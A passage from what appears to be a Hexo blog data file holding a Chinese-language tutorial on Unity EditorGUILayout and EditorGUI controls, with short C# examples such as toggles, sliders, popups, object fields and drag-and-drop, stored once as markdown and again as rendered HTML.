EditorWindow\n    {\n        [MenuItem(\"Window/Example\")]\n        static void Open()\n        {\n            GetWindow<TestEditorWindow>();\n        }\n\n        void OnGUI()\n        {\n            EditorGUILayout.LabelField(\"Example Label\");\n        }\n    }\n```\n* 2:Toggle\n```\n    bool showBtn = true;\n    void OnGUI()\n    {\n        showBtn = EditorGUILayout.Toggle(\"Show Button\",showBtn);\n        if(showBtn){  //开关点开\n            if(GUILayout.Button(\"Close\")){ //绘制按钮\n                this.Close(); //关闭面板\n            }\n        }\n    }\n```\n```\n    void OnGUI()\n    {\n        EditorGUI.BeginChangeCheck();\n\n        toggleValue = EditorGUILayout.ToggleLeft(\"Toggle\", toggleValue);\n\n        //toggleValue 值每次改变时,EditorGUI.EndChangeCheck()都返回true\n        if (EditorGUI.EndChangeCheck())\n        {\n            if (toggleValue)\n            {\n                Debug.Log(\"toggleValue:\" + toggleValue);\n            }\n            else\n            {\n                Debug.Log(\"toggleValue:\" + toggleValue);\n            }\n        }\n        bool on = GUILayout.Toggle(on, on ? \"on\" : \"off\", \"button\");\n    }\n```\n\n```\n    bool toggleValue;\n\n    Stack<bool> stack = new Stack<bool> ();\n\n    void OnGUI ()\n    {\n        {\n            stack.Push (GUI.changed);\n            GUI.changed = false;\n        }\n        toggleValue = EditorGUILayout.ToggleLeft (\"Toggle\", toggleValue);\n        {\n            bool changed = GUI.changed;\n\n            GUI.changed |= stack.Pop ();\n        }\n        if (changed) {\n            Debug.Log (\"toggleValue\");\n        }\n    }\n\n```\n```\n    bool toggleValue;\n\n    Stack<bool> stack = new Stack<bool>();\n\n    void OnGUI()\n    {\n        stack.Push(GUI.changed);\n        GUI.changed = false;\n        \n        toggleValue = EditorGUILayout.ToggleLeft(\"Toggle\", toggleValue);\n        \n        bool changed = GUI.changed;\n        Debug.Log(\"changed:\" + changed);\n\n        GUI.changed |= stack.Pop();\n\n        if (changed)\n        {\n            Debug.Log(\"toggleValue\");\n        }\n    }\n```\n```\n    private bool groupEnabled; //区域开关\n    void OnGUI()\n    {\n        groupEnabled = EditorGUILayout.BeginToggleGroup(\"Optional Settings\", groupEnabled);\n        ///其他编辑代码\n        EditorGUILayout.EndToggleGroup();\n    }\n```\n* 3:ObjectField\n```\n    void OnGUI ()\n    {\n        EditorGUILayout.ObjectField (null, typeof(Object), false);\n\n        EditorGUILayout.ObjectField (null, typeof(Material), false);\n\n        EditorGUILayout.ObjectField (null, typeof(AudioClip), false);\n\n        var options = new []{GUILayout.Width (64), GUILayout.Height (64)};\n\n        EditorGUILayout.ObjectField (null, typeof(Texture), false, options);\n\n        EditorGUILayout.ObjectField (null, typeof(Sprite), false, options);\n    }\n```\n* 4:EditorGUI.MultiFloatField\n```\n    float[] numbers = new float[] {\n        0,\n        1,\n        2\n    };\n\n    GUIContent[] contents = new GUIContent[] {\n        new GUIContent (\"X\"),\n        new GUIContent (\"Y\"),\n        new GUIContent (\"Z\")\n    };\n\n    void OnGUI()\n    {\n        EditorGUI.MultiFloatField(\n            new Rect(30, 30, 200, EditorGUIUtility.singleLineHeight),\n            new GUIContent(\"Label\"),\n            contents,\n            numbers);\n    }\n```\n* 5: EditorGUI.indentLevel 层级表现\n```\nvoid OnGUI ()\n{\n    EditorGUILayout.LabelField (\"Parent\");\n\n    EditorGUI.indentLevel++;\n\n    EditorGUILayout.LabelField (\"Child\");\n    EditorGUILayout.LabelField (\"Child\");\n\n    EditorGUI.indentLevel--;\n\n    EditorGUILayout.LabelField (\"Parent\");\n\n    EditorGUI.indentLevel++;\n\n    EditorGUILayout.LabelField (\"Child\");\n}\n```\n* 6:EditorGUILayout.Knob,一个圈圈表现\n```\n    float angle = 270;\n\n    void OnGUI()\n    {\n        angle = EditorGUILayout.Knob(Vector2.one * 64,\n            angle, 0, 360, \"度\", Color.gray, Color.red, true);\n    }\n```\n* 7:Scope排版\n```\n    public class HorizontalScope : GUI.Scope\n    {\n            \n        public HorizontalScope()\n        {\n            EditorGUILayout.BeginHorizontal();\n        }\n\n        protected override void CloseScope()\n        {\n            EditorGUILayout.EndHorizontal();\n        }        \n    }\n\n    void OnGUI()\n    {\n\n        using (new EditorGUILayout.HorizontalScope())\n        {\n            GUILayout.Button(\"Button1\");\n            GUILayout.Button(\"Button2\");\n        }\n        using (new EditorGUILayout.HorizontalScope ()) {\n            one = GUILayout.Toggle (one, \"1\", EditorStyles.miniButtonLeft);\n            two = GUILayout.Toggle (two, \"2\", EditorStyles.miniButtonMid);\n            three = GUILayout.Toggle (three, \"3\", EditorStyles.miniButtonRight);\n        }     \n    }\n    \n```\n* 8:Toolbar\n```\n    int selected;\n\n    void OnGUI()\n    {\n        selected = GUILayout.Toolbar(selected, new string[] { \"1\", \"2\", \"3\" });\n        selected = GUILayout.Toolbar(selected, new string[] { \"1\", \"2\", \"3\" }, EditorStyles.toolbarButton);\n        selected = GUILayout.SelectionGrid(selected,new string[] { \"1\", \"2\", \"3\" }, 1, \"PreferencesKeysElement\");\n    }\n```\n* 9:SelectableLabel 可选择标签(通常用于显示只读信息，可以被复制粘贴)\n```\nstring text=\"hiahia\";\n    void OnGUI()\n    {\n        EditorGUILayout.SelectableLabel(text); //文本：可以选择然后复制粘贴\n    }\n```\n* 10:PasswordField 密码字段\n```\n    //创建密码字段并可视化\n    string text = \"Some text here\";\n    bool showBtn = true;\n    void OnGUI() \n    {\n        text = EditorGUILayout.PasswordField(\"Password:\",text);\n        showBtn = EditorGUILayout.Toggle(\"Show Button\", showBtn);\n        if (showBtn)\n        {\n            EditorGUILayout.LabelField(\"密码:\", text);\n        }\n    }\n```\n* 11:Slider 滑动条 IntSlider 整数滑动条 MinMaxSlider 最小最大滑动条\n```\n    //随机放置选择的物体在最小最大滑动条之间\n    float  minVal = -10.0f;\n    float minLimit = -20.0f;\n    float maxVal = 10.0f;\n    float maxLimit = 20.0f;\n    void OnGUI()\n    {\n        EditorGUILayout.LabelField(\"Min Val:\", minVal.ToString());\n        EditorGUILayout.LabelField(\"Max Val:\", maxVal.ToString());\n        EditorGUILayout.MinMaxSlider(ref minVal,ref  maxVal, minLimit, maxLimit);\n\n    }\n```\n* 12:Popup弹出选择菜单\n```\n    string[] options = { \"Cube\",\"Sphere\",\"Plane\"};\n    int index = 0;\n    void OnGUI()\n    {\n        index = EditorGUILayout.Popup(index, options);\n    }\n```\n```\n    enum OPTIONS\n    {\n        CUBE = 0,\n        SPHERE = 1,\n        PLANE = 2\n    }\n    public class myEditor3 : EditorWindow {\n        OPTIONS op=OPTIONS.CUBE;\n        [MenuItem(\"cayman/tempShow\")]\n        static void newWelcome()\n        {\n            EditorWindow.GetWindow(typeof(myEditor3), true, \"Eam\");\n        }\n        void OnGUI()\n        {\n        op = (OPTIONS)EditorGUILayout.EnumPopup(\"Primitive to create:\", op)  ;\n        }\n    }\n```\n```\n    int selectedSize = 1;\n    string[] names = { \"Normal\",\"Double\",\"Quadruple\"};\n    int[] sizes = { 1,2,4};\n    void OnGUI()\n    {\n        selectedSize = EditorGUILayout.IntPopup(\"Resize Scale: \", selectedSize, names, sizes);\n        if (GUILayout.Button(\"Scale\"))\n            ReScale();\n    }\n    void ReScale()\n    {\n        if (Selection.activeTransform)\n            Selection.activeTransform.localScale =new Vector3(selectedSize, selectedSize, selectedSize);\n        else Debug.LogError(\"No Object selected, please select an object to scale.\");\n    }\n```\n\n* 13:ColorField 颜色字段 \n```\n    Color matColor = Color.white;\n    void OnGUI()\n    {\n        matColor = EditorGUILayout.ColorField(\"New Color\", matColor);\n \n    }\n```\n* 14:Vector2Field 二维向量字段 Vector3Field 三维向量字段(略，同2维)\n```\n    float distance = 0;\n    Vector2 p1, p2;\n    void OnGUI()\n    {\n        p1 = EditorGUILayout.Vector2Field(\"Point 1:\", p1);\n        p2 = EditorGUILayout.Vector2Field(\"Point 2:\", p2);\n        EditorGUILayout.LabelField(\"Distance:\", distance.ToString());\n    }\n    void OnInspectorUpdate() //面板刷新\n    {\n        distance = Vector2.Distance(p1, p2);\n        this.Repaint();\n    }\n```\n* 15:TagField 标签字段 LayerField层字段\n```\n    string tagStr = \"\";\n    int selectedLayer=0;\n    void OnGUI()\n    {  //为游戏物体设置\n        tagStr = EditorGUILayout.TagField(\"Tag for Objects:\", tagStr);\n        tagStr = EditorGUILayout.LayerField(\"Layer for Objects:\", selectedLayer);\n        if (GUILayout.Button(\"Set Tag!\"))\n            SetTags();\n        if(GUILayout.Button(\"Set Layer!\"))\n            SetLayer();\n    }\n    void SetTags() {\n        foreach(GameObject go in Selection.gameObjects)\n            go.tag = tagStr;\n    }\n     void SetLayer() {\n        foreach(GameObject go in Selection.gameObjects)\n            go.laye = selectedLayer;\n    }\n```\n* 16:打开保存位置文件夹\n```\nstring path;\nGUILayout.Label (\"Save Path\", EditorStyles.boldLabel);\nEditorGUILayout.BeginHorizontal();\nEditorGUILayout.TextField(path,GUILayout.ExpandWidth(false));\nif(GUILayout.Button(\"Browse\",GUILayout.ExpandWidth(false)))\n            path = EditorUtility.SaveFolderPanel(\"Path to Save Images\",path,Application.dataPath);   //打开保存文件夹面板\nEditorGUILayout.EndHorizontal();\n```\n* 17:折叠标签,下面的player.weaponDamage1和player.weaponDamage2属性,都会被折叠在Weapons标签里面\n```\n        bool showWeapons;\n        showWeapons = EditorGUILayout.Foldout(showWeapons, \"Weapons\");\n        if (showWeapons)\n        {\n            player.weaponDamage1 = EditorGUILayout.FloatField(\"武器伤害1\", player.weaponDamage1);\n            player.weaponDamage2 = EditorGUILayout.FloatField(\"武器伤害1\", player.weaponDamage2);\n        }\n```\n* 18:滑动区域 GUILayout.BeginScrollView  GUILayout.EndScrollView();\n选择网格 SelectionGrid,SelectionGrid(int 选择的索引,sting[] 显示文字数组，xCount，格式)\n```\n    GUIStyle textStyle = new GUIStyle(\"textfield\");\n    GUIStyle buttonStyle = new GUIStyle(\"button\");\n    textStyle.active = buttonStyle.active;\n    textStyle.onNormal = buttonStyle.onNormal;\n\n    v2 = GUILayout.BeginScrollView(v2, true, true, GUILayout.Width(300), GUILayout.Height(100));\n    {\n        v = GUILayout.SelectionGrid(v, Messages, 1, textStyle);\n    }\n    GUILayout.EndScrollView();\n```\n* 19:DragAndDrop中的拖拽区域,拖拽一个物体到windos面板上面,得到路径\n```\n        EditorGUILayout.LabelField(\"路径\");\n        //获得一个长300的框  \n        Rect rect = EditorGUILayout.GetControlRect(GUILayout.Width(600));\n        //将上面的框作为文本输入框  \n        path = EditorGUI.TextField(rect, path);\n\n        //如果鼠标正在拖拽中或拖拽结束时，并且鼠标所在位置在文本输入框内  \n        if ((Event.current.type == EventType.DragUpdated\n          || Event.current.type == EventType.DragExited)\n          && rect.Contains(Event.current.mousePosition))\n        {\n            //改变鼠标的外表  \n            DragAndDrop.visualMode = DragAndDropVisualMode.Generic;\n            if (DragAndDrop.paths != null && DragAndDrop.paths.Length > 0)\n            {\n                path = DragAndDrop.paths[0];\n            }\n        }\n```\n* 20:Box绘制GUI.Box(xxx,xxx)\n* 21:window面板的提示1. 打开一个通知栏 this.ShowNotification(new GUIContent(“This is a Notification”));2. 关闭通知栏 this.RemoveNotification();\n* 22:","slug":"Unity/UnityEditor/4 EditorGUI","published":1,"updated":"2020-05-15T02:50:20.587Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0w005a2gk781oba46s","content":"<h1 id=\"EdirotGUILayout-EdirotGUI-方法的简单使用\"><a href=\"#EdirotGUILayout-EdirotGUI-方法的简单使用\" class=\"headerlink\" title=\"EdirotGUILayout / EdirotGUI 方法的简单使用\"></a>EdirotGUILayout / EdirotGUI 方法的简单使用</h1><ul>\n<li>1:编写一个EditorWindow并展示一个label</li>\n</ul>\n<pre><code>    public class TestEditorWindow : EditorWindow\n    {\n        [MenuItem(&quot;Window/Example&quot;)]\n        static void Open()\n        {\n            GetWindow&lt;TestEditorWindow&gt;();\n        }\n\n        void OnGUI()\n        {\n            EditorGUILayout.LabelField(&quot;Example Label&quot;);\n        }\n    }</code></pre><ul>\n<li><p>2:Toggle</p>\n<pre><code>  bool showBtn = true;\n  void OnGUI()\n  {\n      showBtn = EditorGUILayout.Toggle(&quot;Show Button&quot;,showBtn);\n      if(showBtn){  //开关点开\n          if(GUILayout.Button(&quot;Close&quot;)){ //绘制按钮\n              this.Close(); //关闭面板\n          }\n      }\n  }</code></pre><pre><code>  void OnGUI()\n  {\n      EditorGUI.BeginChangeCheck();\n\n      toggleValue = EditorGUILayout.ToggleLeft(&quot;Toggle&quot;, toggleValue);\n\n      //toggleValue 值每次改变时,EditorGUI.EndChangeCheck()都返回true\n      if (EditorGUI.EndChangeCheck())\n      {\n          if (toggleValue)\n          {\n              Debug.Log(&quot;toggleValue:&quot; + toggleValue);\n          }\n          else\n          {\n              Debug.Log(&quot;toggleValue:&quot; + toggleValue);\n          }\n      }\n      bool on = GUILayout.Toggle(on, on ? &quot;on&quot; : &quot;off&quot;, &quot;button&quot;);\n  }</code></pre></li>\n</ul>\n<pre><code>    bool toggleValue;\n\n    Stack&lt;bool&gt; stack = new Stack&lt;bool&gt; ();\n\n    void OnGUI ()\n    {\n        {\n            stack.Push (GUI.changed);\n            GUI.changed = false;\n        }\n        toggleValue = EditorGUILayout.ToggleLeft (&quot;Toggle&quot;, toggleValue);\n        {\n            bool changed = GUI.changed;\n\n            GUI.changed |= stack.Pop ();\n        }\n        if (changed) {\n            Debug.Log (&quot;toggleValue&quot;);\n        }\n    }\n</code></pre><pre><code>    bool toggleValue;\n\n    Stack&lt;bool&gt; stack = new Stack&lt;bool&gt;();\n\n    void OnGUI()\n    {\n        stack.Push(GUI.changed);\n        GUI.changed = false;\n\n        toggleValue = EditorGUILayout.ToggleLeft(&quot;Toggle&quot;, toggleValue);\n\n        bool changed = GUI.changed;\n        Debug.Log(&quot;changed:&quot; + changed);\n\n        GUI.changed |= stack.Pop();\n\n        if (changed)\n        {\n            Debug.Log(&quot;toggleValue&quot;);\n        }\n    }</code></pre><pre><code>    private bool groupEnabled; //区域开关\n    void OnGUI()\n    {\n        groupEnabled = EditorGUILayout.BeginToggleGroup(&quot;Optional Settings&quot;, groupEnabled);\n        ///其他编辑代码\n        EditorGUILayout.EndToggleGroup();\n    }</code></pre><ul>\n<li><p>3:ObjectField</p>\n<pre><code>  void OnGUI ()\n  {\n      EditorGUILayout.ObjectField (null, typeof(Object), false);\n\n      EditorGUILayout.ObjectField (null, typeof(Material), false);\n\n      EditorGUILayout.ObjectField (null, typeof(AudioClip), false);\n\n      var options = new []{GUILayout.Width (64), GUILayout.Height (64)};\n\n      EditorGUILayout.ObjectField (null, typeof(Texture), false, options);\n\n      EditorGUILayout.ObjectField (null, typeof(Sprite), false, options);\n  }</code></pre></li>\n<li><p>4:EditorGUI.MultiFloatField</p>\n<pre><code>  float[] numbers = new float[] {\n      0,\n      1,\n      2\n  };\n\n  GUIContent[] contents = new GUIContent[] {\n      new GUIContent (&quot;X&quot;),\n      new GUIContent (&quot;Y&quot;),\n      new GUIContent (&quot;Z&quot;)\n  };\n\n  void OnGUI()\n  {\n      EditorGUI.MultiFloatField(\n          new Rect(30, 30, 200, EditorGUIUtility.singleLineHeight),\n          new GUIContent(&quot;Label&quot;),\n          contents,\n          numbers);\n  }</code></pre></li>\n<li><p>5: EditorGUI.indentLevel 层级表现</p>\n<pre><code>void OnGUI ()\n{\n  EditorGUILayout.LabelField (&quot;Parent&quot;);\n\n  EditorGUI.indentLevel++;\n\n  EditorGUILayout.LabelField (&quot;Child&quot;);\n  EditorGUILayout.LabelField (&quot;Child&quot;);\n\n  EditorGUI.indentLevel--;\n\n  EditorGUILayout.LabelField (&quot;Parent&quot;);\n\n  EditorGUI.indentLevel++;\n\n  EditorGUILayout.LabelField (&quot;Child&quot;);\n}</code></pre></li>\n<li><p>6:EditorGUILayout.Knob,一个圈圈表现</p>\n<pre><code>  float angle = 270;\n\n  void OnGUI()\n  {\n      angle = EditorGUILayout.Knob(Vector2.one * 64,\n          angle, 0, 360, &quot;度&quot;, Color.gray, Color.red, true);\n  }</code></pre></li>\n<li><p>7:Scope排版</p>\n<pre><code>  public class HorizontalScope : GUI.Scope\n  {\n\n      public HorizontalScope()\n      {\n          EditorGUILayout.BeginHorizontal();\n      }\n\n      protected override void CloseScope()\n      {\n          EditorGUILayout.EndHorizontal();\n      }        \n  }\n\n  void OnGUI()\n  {\n\n      using (new EditorGUILayout.HorizontalScope())\n      {\n          GUILayout.Button(&quot;Button1&quot;);\n          GUILayout.Button(&quot;Button2&quot;);\n      }\n      using (new EditorGUILayout.HorizontalScope ()) {\n          one = GUILayout.Toggle (one, &quot;1&quot;, EditorStyles.miniButtonLeft);\n          two = GUILayout.Toggle (two, &quot;2&quot;, EditorStyles.miniButtonMid);\n          three = GUILayout.Toggle (three, &quot;3&quot;, EditorStyles.miniButtonRight);\n      }     \n  }\n</code></pre></li>\n</ul>\n<pre><code>* 8:Toolbar</code></pre><pre><code>int selected;\n\nvoid OnGUI()\n{\n    selected = GUILayout.Toolbar(selected, new string[] { &quot;1&quot;, &quot;2&quot;, &quot;3&quot; });\n    selected = GUILayout.Toolbar(selected, new string[] { &quot;1&quot;, &quot;2&quot;, &quot;3&quot; }, EditorStyles.toolbarButton);\n    selected = GUILayout.SelectionGrid(selected,new string[] { &quot;1&quot;, &quot;2&quot;, &quot;3&quot; }, 1, &quot;PreferencesKeysElement&quot;);\n}</code></pre><pre><code>* 9:SelectableLabel 可选择标签(通常用于显示只读信息，可以被复制粘贴)</code></pre><p>string text=”hiahia”;<br>    void OnGUI()<br>    {<br>        EditorGUILayout.SelectableLabel(text); //文本：可以选择然后复制粘贴<br>    }</p>\n<pre><code>* 10:PasswordField 密码字段</code></pre><pre><code>//创建密码字段并可视化\nstring text = &quot;Some text here&quot;;\nbool showBtn = true;\nvoid OnGUI() \n{\n    text = EditorGUILayout.PasswordField(&quot;Password:&quot;,text);\n    showBtn = EditorGUILayout.Toggle(&quot;Show Button&quot;, showBtn);\n    if (showBtn)\n    {\n        EditorGUILayout.LabelField(&quot;密码:&quot;, text);\n    }\n}</code></pre><pre><code>* 11:Slider 滑动条 IntSlider 整数滑动条 MinMaxSlider 最小最大滑动条</code></pre><pre><code>//随机放置选择的物体在最小最大滑动条之间\nfloat  minVal = -10.0f;\nfloat minLimit = -20.0f;\nfloat maxVal = 10.0f;\nfloat maxLimit = 20.0f;\nvoid OnGUI()\n{\n    EditorGUILayout.LabelField(&quot;Min Val:&quot;, minVal.ToString());\n    EditorGUILayout.LabelField(&quot;Max Val:&quot;, maxVal.ToString());\n    EditorGUILayout.MinMaxSlider(ref minVal,ref  maxVal, minLimit, maxLimit);\n\n}</code></pre><pre><code>* 12:Popup弹出选择菜单</code></pre><pre><code>string[] options = { &quot;Cube&quot;,&quot;Sphere&quot;,&quot;Plane&quot;};\nint index = 0;\nvoid OnGUI()\n{\n    index = EditorGUILayout.Popup(index, options);\n}</code></pre><pre><code></code></pre><pre><code>enum OPTIONS\n{\n    CUBE = 0,\n    SPHERE = 1,\n    PLANE = 2\n}\npublic class myEditor3 : EditorWindow {\n    OPTIONS op=OPTIONS.CUBE;\n    [MenuItem(&quot;cayman/tempShow&quot;)]\n    static void newWelcome()\n    {\n        EditorWindow.GetWindow(typeof(myEditor3), true, &quot;Eam&quot;);\n    }\n    void OnGUI()\n    {\n    op = (OPTIONS)EditorGUILayout.EnumPopup(&quot;Primitive to create:&quot;, op)  ;\n    }\n}</code></pre><pre><code></code></pre><pre><code>int selectedSize = 1;\nstring[] names = { &quot;Normal&quot;,&quot;Double&quot;,&quot;Quadruple&quot;};\nint[] sizes = { 1,2,4};\nvoid OnGUI()\n{\n    selectedSize = EditorGUILayout.IntPopup(&quot;Resize Scale: &quot;, selectedSize, names, sizes);\n    if (GUILayout.Button(&quot;Scale&quot;))\n        ReScale();\n}\nvoid ReScale()\n{\n    if (Selection.activeTransform)\n        Selection.activeTransform.localScale =new Vector3(selectedSize, selectedSize, selectedSize);\n    else Debug.LogError(&quot;No Object selected, please select an object to scale.&quot;);\n}</code></pre><pre><code>\n* 13:ColorField 颜色字段 </code></pre><pre><code>Color matColor = Color.white;\nvoid OnGUI()\n{\n    matColor = EditorGUILayout.ColorField(&quot;New Color&quot;, matColor);\n\n}</code></pre><pre><code>* 14:Vector2Field 二维向量字段 Vector3Field 三维向量字段(略，同2维)</code></pre><pre><code>float distance = 0;\nVector2 p1, p2;\nvoid OnGUI()\n{\n    p1 = EditorGUILayout.Vector2Field(&quot;Point 1:&quot;, p1);\n    p2 = EditorGUILayout.Vector2Field(&quot;Point 2:&quot;, p2);\n    EditorGUILayout.LabelField(&quot;Distance:&quot;, distance.ToString());\n}\nvoid OnInspectorUpdate() //面板刷新\n{\n    distance = Vector2.Distance(p1, p2);\n    this.Repaint();\n}</code></pre><pre><code>* 15:TagField 标签字段 LayerField层字段</code></pre><pre><code>string tagStr = &quot;&quot;;\nint selectedLayer=0;\nvoid OnGUI()\n{  //为游戏物体设置\n    tagStr = EditorGUILayout.TagField(&quot;Tag for Objects:&quot;, tagStr);\n    tagStr = EditorGUILayout.LayerField(&quot;Layer for Objects:&quot;, selectedLayer);\n    if (GUILayout.Button(&quot;Set Tag!&quot;))\n        SetTags();\n    if(GUILayout.Button(&quot;Set Layer!&quot;))\n        SetLayer();\n}\nvoid SetTags() {\n    foreach(GameObject go in Selection.gameObjects)\n        go.tag = tagStr;\n}\n void SetLayer() {\n    foreach(GameObject go in Selection.gameObjects)\n        go.laye = selectedLayer;\n}</code></pre><pre><code>* 16:打开保存位置文件夹</code></pre><p>string path;<br>GUILayout.Label (“Save Path”, EditorStyles.boldLabel);<br>EditorGUILayout.BeginHorizontal();<br>EditorGUILayout.TextField(path,GUILayout.ExpandWidth(false));<br>if(GUILayout.Button(“Browse”,GUILayout.ExpandWidth(false)))<br>            path = EditorUtility.SaveFolderPanel(“Path to Save Images”,path,Application.dataPath);   //打开保存文件夹面板<br>EditorGUILayout.EndHorizontal();</p>\n<pre><code>* 17:折叠标签,下面的player.weaponDamage1和player.weaponDamage2属性,都会被折叠在Weapons标签里面</code></pre><pre><code>    bool showWeapons;\n    showWeapons = EditorGUILayout.Foldout(showWeapons, &quot;Weapons&quot;);\n    if (showWeapons)\n    {\n        player.weaponDamage1 = EditorGUILayout.FloatField(&quot;武器伤害1&quot;, player.weaponDamage1);\n        player.weaponDamage2 = EditorGUILayout.FloatField(&quot;武器伤害1&quot;, player.weaponDamage2);\n    }</code></pre><pre><code>* 18:滑动区域 GUILayout.BeginScrollView  GUILayout.EndScrollView();\n选择网格 SelectionGrid,SelectionGrid(int 选择的索引,sting[] 显示文字数组，xCount，格式)</code></pre><pre><code>GUIStyle textStyle = new GUIStyle(&quot;textfield&quot;);\nGUIStyle buttonStyle = new GUIStyle(&quot;button&quot;);\ntextStyle.active = buttonStyle.active;\ntextStyle.onNormal = buttonStyle.onNormal;\n\nv2 = GUILayout.BeginScrollView(v2, true, true, GUILayout.Width(300), GUILayout.Height(100));\n{\n    v = GUILayout.SelectionGrid(v, Messages, 1, textStyle);\n}\nGUILayout.EndScrollView();</code></pre><pre><code>* 19:DragAndDrop中的拖拽区域,拖拽一个物体到windos面板上面,得到路径</code></pre><pre><code>    EditorGUILayout.LabelField(&quot;路径&quot;);\n    //获得一个长300的框  \n    Rect rect = EditorGUILayout.GetControlRect(GUILayout.Width(600));\n    //将上面的框作为文本输入框  \n    path = EditorGUI.TextField(rect, path);\n\n    //如果鼠标正在拖拽中或拖拽结束时，并且鼠标所在位置在文本输入框内  \n    if ((Event.current.type == EventType.DragUpdated\n      || Event.current.type == EventType.DragExited)\n      &amp;&amp; rect.Contains(Event.current.mousePosition))\n    {\n        //改变鼠标的外表  \n        DragAndDrop.visualMode = DragAndDropVisualMode.Generic;\n        if (DragAndDrop.paths != null &amp;&amp; DragAndDrop.paths.Length &gt; 0)\n        {\n            path = DragAndDrop.paths[0];\n        }\n    }</code></pre><p>```</p>\n<ul>\n<li>20:Box绘制GUI.Box(xxx,xxx)</li>\n<li>21:window面板的提示1. 打开一个通知栏 this.ShowNotification(new GUIContent(“This is a Notification”));2. 关闭通知栏 this.RemoveNotification();</li>\n<li>22:</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"EdirotGUILayout-EdirotGUI-方法的简单使用\"><a href=\"#EdirotGUILayout-EdirotGUI-方法的简单使用\" class=\"headerlink\" title=\"EdirotGUILayout / EdirotGUI 方法的简单使用\"></a>EdirotGUILayout / EdirotGUI 方法的简单使用</h1><ul>\n<li>1:编写一个EditorWindow并展示一个label</li>\n</ul>\n<pre><code>    public class TestEditorWindow : EditorWindow\n    {\n        [MenuItem(&quot;Window/Example&quot;)]\n        static void Open()\n        {\n            GetWindow&lt;TestEditorWindow&gt;();\n        }\n\n        void OnGUI()\n        {\n            EditorGUILayout.LabelField(&quot;Example Label&quot;);\n        }\n    }</code></pre><ul>\n<li><p>2:Toggle</p>\n<pre><code>  bool showBtn = true;\n  void OnGUI()\n  {\n      showBtn = EditorGUILayout.Toggle(&quot;Show Button&quot;,showBtn);\n      if(showBtn){  //开关点开\n          if(GUILayout.Button(&quot;Close&quot;)){ //绘制按钮\n              this.Close(); //关闭面板\n          }\n      }\n  }</code></pre><pre><code>  void OnGUI()\n  {\n      EditorGUI.BeginChangeCheck();\n\n      toggleValue = EditorGUILayout.ToggleLeft(&quot;Toggle&quot;, toggleValue);\n\n      //toggleValue 值每次改变时,EditorGUI.EndChangeCheck()都返回true\n      if (EditorGUI.EndChangeCheck())\n      {\n          if (toggleValue)\n          {\n              Debug.Log(&quot;toggleValue:&quot; + toggleValue);\n          }\n          else\n          {\n              Debug.Log(&quot;toggleValue:&quot; + toggleValue);\n          }\n      }\n      bool on = GUILayout.Toggle(on, on ? &quot;on&quot; : &quot;off&quot;, &quot;button&quot;);\n  }</code></pre></li>\n</ul>\n<pre><code>    bool toggleValue;\n\n    Stack&lt;bool&gt; stack = new Stack&lt;bool&gt; ();\n\n    void OnGUI ()\n    {\n        {\n            stack.Push (GUI.changed);\n            GUI.changed = false;\n        }\n        toggleValue = EditorGUILayout.ToggleLeft (&quot;Toggle&quot;, toggleValue);\n        {\n            bool changed = GUI.changed;\n\n            GUI.changed |= stack.Pop ();\n        }\n        if (changed) {\n            Debug.Log (&quot;toggleValue&quot;);\n        }\n    }\n</code></pre><pre><code>    bool toggleValue;\n\n    Stack&lt;bool&gt; stack = new Stack&lt;bool&gt;();\n\n    void OnGUI()\n    {\n        stack.Push(GUI.changed);\n        GUI.changed = false;\n\n        toggleValue = EditorGUILayout.ToggleLeft(&quot;Toggle&quot;, toggleValue);\n\n        bool changed = GUI.changed;\n        Debug.Log(&quot;changed:&quot; + changed);\n\n        GUI.changed |= stack.Pop();\n\n        if (changed)\n        {\n            Debug.Log(&quot;toggleValue&quot;);\n        }\n    }</code></pre><pre><code>    private bool groupEnabled; //区域开关\n    void OnGUI()\n    {\n        groupEnabled = EditorGUILayout.BeginToggleGroup(&quot;Optional Settings&quot;, groupEnabled);\n        ///其他编辑代码\n        EditorGUILayout.EndToggleGroup();\n    }</code></pre><ul>\n<li><p>3:ObjectField</p>\n<pre><code>  void OnGUI ()\n  {\n      EditorGUILayout.ObjectField (null, typeof(Object), false);\n\n      EditorGUILayout.ObjectField (null, typeof(Material), false);\n\n      EditorGUILayout.ObjectField (null, typeof(AudioClip), false);\n\n      var options = new []{GUILayout.Width (64), GUILayout.Height (64)};\n\n      EditorGUILayout.ObjectField (null, typeof(Texture), false, options);\n\n      EditorGUILayout.ObjectField (null, typeof(Sprite), false, options);\n  }</code></pre></li>\n<li><p>4:EditorGUI.MultiFloatField</p>\n<pre><code>  float[] numbers = new float[] {\n      0,\n      1,\n      2\n  };\n\n  GUIContent[] contents = new GUIContent[] {\n      new GUIContent (&quot;X&quot;),\n      new GUIContent (&quot;Y&quot;),\n      new GUIContent (&quot;Z&quot;)\n  };\n\n  void OnGUI()\n  {\n      EditorGUI.MultiFloatField(\n          new Rect(30, 30, 200, EditorGUIUtility.singleLineHeight),\n          new GUIContent(&quot;Label&quot;),\n          contents,\n          numbers);\n  }</code></pre></li>\n<li><p>5: EditorGUI.indentLevel 层级表现</p>\n<pre><code>void OnGUI ()\n{\n  EditorGUILayout.LabelField (&quot;Parent&quot;);\n\n  EditorGUI.indentLevel++;\n\n  EditorGUILayout.LabelField (&quot;Child&quot;);\n  EditorGUILayout.LabelField (&quot;Child&quot;);\n\n  EditorGUI.indentLevel--;\n\n  EditorGUILayout.LabelField (&quot;Parent&quot;);\n\n  EditorGUI.indentLevel++;\n\n  EditorGUILayout.LabelField (&quot;Child&quot;);\n}</code></pre></li>\n<li><p>6:EditorGUILayout.Knob,一个圈圈表现</p>\n<pre><code>  float angle = 270;\n\n  void OnGUI()\n  {\n      angle = EditorGUILayout.Knob(Vector2.one * 64,\n          angle, 0, 360, &quot;度&quot;, Color.gray, Color.red, true);\n  }</code></pre></li>\n<li><p>7:Scope排版</p>\n<pre><code>  public class HorizontalScope : GUI.Scope\n  {\n\n      public HorizontalScope()\n      {\n          EditorGUILayout.BeginHorizontal();\n      }\n\n      protected override void CloseScope()\n      {\n          EditorGUILayout.EndHorizontal();\n      }        \n  }\n\n  void OnGUI()\n  {\n\n      using (new EditorGUILayout.HorizontalScope())\n      {\n          GUILayout.Button(&quot;Button1&quot;);\n          GUILayout.Button(&quot;Button2&quot;);\n      }\n      using (new EditorGUILayout.HorizontalScope ()) {\n          one = GUILayout.Toggle (one, &quot;1&quot;, EditorStyles.miniButtonLeft);\n          two = GUILayout.Toggle (two, &quot;2&quot;, EditorStyles.miniButtonMid);\n          three = GUILayout.Toggle (three, &quot;3&quot;, EditorStyles.miniButtonRight);\n      }     \n  